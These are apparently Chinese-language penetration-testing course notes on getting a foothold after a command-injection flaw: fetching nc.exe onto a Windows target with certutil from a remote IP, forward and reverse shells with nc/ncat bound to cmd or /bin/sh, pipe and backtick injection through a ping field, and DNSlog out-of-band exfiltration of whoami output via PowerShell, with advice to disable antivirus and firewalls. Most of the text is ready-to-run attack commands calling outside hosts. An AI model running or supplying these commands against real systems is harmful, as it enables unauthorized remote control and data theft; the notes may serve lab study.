### 实用案例1：文件上传下载-解决无图形化&解决数据传输
_Tips:_
_文件需传到网站目录_
_记得结束其他apache进程，防止占用端口_
_提前用浏览器直接访问测试文件是否在目录中_


命令生成：https://forum.ywhack.com/bountytips.php?download
Linux：wget curl python ruby perl java等
Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等

NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end)工具，能被其它的程序程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。

netcat可以使用tcp和udp协议.之所以叫做netcat,因为它是网络上的cat,想象一下cat的功能,读出一个文件的内容,然后输出到屏幕上(默认的stdout是屏幕,当然可以重定向到其他地方).netcat也是如此,它读取一端的输入,然后传送到网络的另一端
（[https://blog.csdn.net/cavalier_anyue/article/details/45477599](https://blog.csdn.net/cavalier_anyue/article/details/45477599)）

测试时需要关闭防病毒
certutil.exe -urlcache -split -f http://47.242.189.147:80/nc.exe ncs.exe

### 实用案例2：反弹Shell命令-解决数据回显&解决数据通讯
Nc在Linux上自带，Windows上不自带。
命令生成：https://forum.ywhack.com/shell.php
正（主动）和反（被动）是相对的，看以哪一台服务器作参照
包管理工具问题：[https://blog.csdn.net/lvoelife/article/details/129146477](https://blog.csdn.net/lvoelife/article/details/129146477)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36014252/1690000610298-8a5aeefe-7345-4183-8d7f-981a26fcf284.png#averageHue=%23ebeaea&clientId=u6d8d170e-0eef-4&from=ui&id=ukbyW&originHeight=618&originWidth=1037&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61862&status=done&style=none&taskId=u801565bf-6853-4150-9da0-bfc1a68afac&title=)
#### 1、正向连接：本地监听等待对方连接
Linux控制Windows
//绑定CMD到本地5566端口
nc -e cmd -lvvp 5566
//主动连接目标5566
ncat 47.242.189.147 5566

_yum install nmap-ncat -y //centos _
_sudo apt-get -y install netcat-traditional //ubuntu_
_若出现乱码：_输入 chcp 65001（[https://blog.csdn.net/hnlgzb/article/details/81911824](https://blog.csdn.net/hnlgzb/article/details/81911824)）
exit退出

Windows控制Linux
//绑定SH到本地5566端口（执行命令）
ncat -e /bin/sh -lvp 5566
//主动连接目标5566
nc 47.94.236.117 5566
（需要Linux和Windows都要关闭防火墙）

#### 2、反向连接：主动给出去，对方监听
//绑定SH到目标5566端口
ncat -e /bin/sh 47.122.23.131 5566（多了一个对方的IP地址）
//等待5566连接
nc -lvvp 5566

//绑定CMD到目标5566端口
nc -e cmd 47.94.236.117 5566
//等待5566连接
ncat -lvvp 5566

### 实际案例3：防火墙-正向连接&反向连接&内网服务器
_可能有的问题：_
_1、Linux服务器上搭建Tomcat，注意端口是8080_
_2、注意tomcat的文件目录_
_3、利用宝塔搭建网站，在本机操作Windows服务器_
_4、宝塔会拦截函数、使用小皮时出现乱码，重新安装后成功_

**管道符**：| (管道符号) ||（逻辑或） &&（逻辑与）  &(后台任务符号)
Windows->| & || &&
**Linux->; | || & && ``(特有``和;)**
例子：
 ping `whoami`（ping: root: Name or service not known）
ping `pwd`（ping: /root: Name or service not known）（当前目录）
ping -c 1 127.0.0.1 ; whoami（ping报错，whoami执行）
ping -c 1 127.0.0.1 | whoami
ping -c 1 127.0.0.1 || whoami
ping -c 1 127.0.0.1 & whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 `whoami`
_总而言之，多执行一条命令_

演示：
1、判断windows
2、windows没有自带的nc
3、想办法上传nc 反弹权限（提前放好nc在自己的服务器）（放到对方的c盘）（注意关闭防火墙）
certutil.exe -urlcache -split -f http://47.242.189.147:80/nc.exe c:\\nc.exe
4、反弹
127.0.0.1|c://nc.exe -e cmd 8.210.159.218 5566
ncat -lvvp 5566

![imae.png](https://cdn.nlark.com/yuque/0/2023/png/36014252/1690000624267-40cc9daa-f52e-469a-9c53-719cff2c2f2f.png#averageHue=%23e9e6e5&clientId=u6d8d170e-0eef-4&from=ui&id=wMDJJ&originHeight=605&originWidth=1009&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77588&status=done&style=none&taskId=u786d4895-ad60-459c-8ab9-e28dbe52c36&title=)
开启入站策略，采用反向连接
Linux：ncat -lvvp 5566
Windows：127.0.0.1 | c:\\nc.exe -e cmd 8.210.159.218 5566
开启出站策略，采用正向连接

防火墙开启后入站规则更加严苛，只能使用默认通讯端口，除非添加规则
Linux：ncat -e cmd 47.242.189.147 5566
Windows：127.0.0.1 | nc -e cmd -lvvp 5566
正反向反弹案例-内网服务器
只能内网主动交出数据，反向连接
_检查网络状态（netstat -an)_
_net stop Mysql_
_//这里的服务名称根据自己系统服务里的名称_
_sc delete Mysql_
_//将服务从windows的服务注册表中删除_

### 实际案例4：防火墙组合数据不回显-ICMP带外查询Dnslog
1、dnslog.cn
2 、ping `whoami`.gcuaukgu.com
3、此方法只能在Linux服务器上使用，因为Windows服务器不支持此拼接方法
4、故使用powershell命令，将数据能够带
 $x=whoami;$y='.wbw4rk.dnslog.cn';
 echo $x
 echo $y
 echo $x+$y
ping $z（此时找不到，地址里有分号）
 $xx=$x.replace('\','xxxx');
 $z=$xx+$y;
echo$z;
返回dnslog刷新页面

总结：出站入站都开启策略（数据不回显）
127.0.0.1 | powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.5m5lgl.dnslog.cn';$z=$x+$y;ping $z
为什么这样写：cmd不执行whoami（被ping命令干扰），需要将其结果外带
用powershell变量赋值，把执行结果给变量
结果带有“/”导致ping无法执行


**漏洞有，但是数据不回显：**
**1、反弹shell**
**2、带外查询**

ping命令可绕过防火墙，因为其走的都是icmp协议，防火墙过滤的是tcp和udp
` ` ; 


ping 127.0.0.1 | 

powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.vpod5d.dnslog.cn';$z=$x+$y;ping $z

127.0.0.1 | powershell $x=ver;$x=$x.Replace('\','xxx');$y='.vpod5d.dnslog.cn';$z=$x+$y;ping $z
